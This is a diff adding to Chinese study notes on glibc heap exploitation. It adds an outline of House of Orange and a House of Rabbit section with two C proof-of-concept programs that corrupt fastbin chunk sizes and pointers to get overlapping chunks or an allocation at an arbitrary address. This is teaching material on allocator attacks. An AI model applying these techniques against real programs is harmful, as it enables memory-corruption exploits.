@@ -33,6 +33,7 @@
     - [House Of Force](#house-of-force)
     - [House of Lore](#house-of-lore)
     - [House of Orange](#house-of-orange)
+    - [House of rabbit](#house-of-rabbit)
   - [other](#other)
     - [通过 `main_arena`地址获取 `glibc`基地址的偏移](#通过-main_arena地址获取-glibc基地址的偏移)
     - [\_\_malloc\_hook和\_\_free\_hook](#__malloc_hook和__free_hook)
@@ -1173,6 +1174,119 @@ int main()
 ```
 
 ### House of Orange
+
+__危害:__
+
+获取一个`unsorted bin`
+
+__条件:__
+
+可以修改`top chunk`的`size`
+
+__攻击:__
+
+- `top chunk`的`size`，使其对齐到最小内存页
+- 申请一个大的`chunk`以将`top chunk`放入`unsorted bin`
+
+__注意:__
+
+1. 伪造的 `size` 必须要对齐到内存页
+2. `size` 要大于 `MINSIZE(0x10)`
+3. `size` 要小于之后申请的 `chunk size + MINSIZE(0x10)`
+4. `size` 的 `prev inuse` 位必须为 `1`
+
+### House of rabbit
+
+__危害:__
+
+修改放入`fast bin`的`chunk`的大小，并在下一次`malloc`时从`small bin`中分配出来实现任意地址分配`chunk`或是实现`Overlapping`
+
+__原理:__
+
+`malloc consolidate` 的时候, 在 `fastbin` 中的堆块进行合并时没有对 `size` 进行检查
+
+__条件:__
+
+可以修改被释放 `chunk` 的 `size` 或者 `fd`
+
+__攻击:__
+
+向`fast bin`中放入`chunk`，然后修改`chunk`的`size`和`fd`，在进行 `malloc consolidate` 时会合并将`chunk`与相邻的空闲`chunk`进行合并，并放入`small bin`
+
+__示例:__
+
+```C
+// 实现Overlapping
+// 基于glibc-2.23
+#include <stdio.h>
+#include <stdlib.h>
+
+int main()
+{
+    size_t *chunk1 = malloc(0x40);
+    size_t *chunk2 = malloc(0x80);
+
+    malloc(0x10); // 防止合并到top chunk
+
+    free(chunk1); // 将chunk1放入fast bin
+
+    chunk1[-1] = 0x50 + 0x90 + 1; // 修改chunk1的size来Overlapping到chunk2
+
+    malloc(0x1000); // 触发Overlapping
+
+    size_t *chunk3 = malloc(0x50 + 0x90 - 0x10); // 将放入small bin中的chunk1分配出来, 重命名为chunk3
+
+    // 此时chunk3被分配出来，但是chunk3中包含着被释放的chunk2内存空间
+    *chunk2 = 0x12346789;
+    printf("num : %lx\n", *chunk2);
+    printf("num : %lx\n", *(chunk3 + 0x50 / 8));
+
+    return 0;
+}
+```
+
+```C
+// 实现任意地址创建chunk
+// 基于glibc-2.35
+// 高版本需要注意 tcache bin，使用export GLIBC_TUNABLES=glibc.malloc.tcache_count=0
+#include <stdio.h>
+#include <stdlib.h>
+
+#define PROTECT_PTR(pos, ptr) \
+  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
+#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)
+
+int main()
+{
+    size_t fakechunk[10] = {0};
+    size_t *p = malloc(0x10);
+    free(p);
+
+    // 伪造chunk
+    fakechunk[1] = 0x21;
+    fakechunk[2] = 0;
+    fakechunk[2] = (size_t)REVEAL_PTR(fakechunk[2]);
+    // 需要让next next chunk的size为0x21，否则会unlinknext chunk
+    fakechunk[5] = 0x21;    // next chunk
+    fakechunk[9] = 0x21;    // next next chunk
+
+    *p = (size_t)fakechunk;
+    *p = (size_t)REVEAL_PTR(*p);
+    
+    malloc(0x1000);
+    
+    printf("fake chunk : %p\n", &fakechunk);
+    printf("malloc     : %p\n", (char*)malloc(0x10) - 0x10);
+
+    return 0;
+}
+```
+
+__注意:__
+
+从glibc-2.27开始, malloc_consolidate会检查chunk的大小是否符合
+从glibc-2.32开始, malloc_consolidate会检查chunk的内存对齐
+具体保护请见[fastbin的安全机制](#fastbin的安全机制)
 
 ## other
 
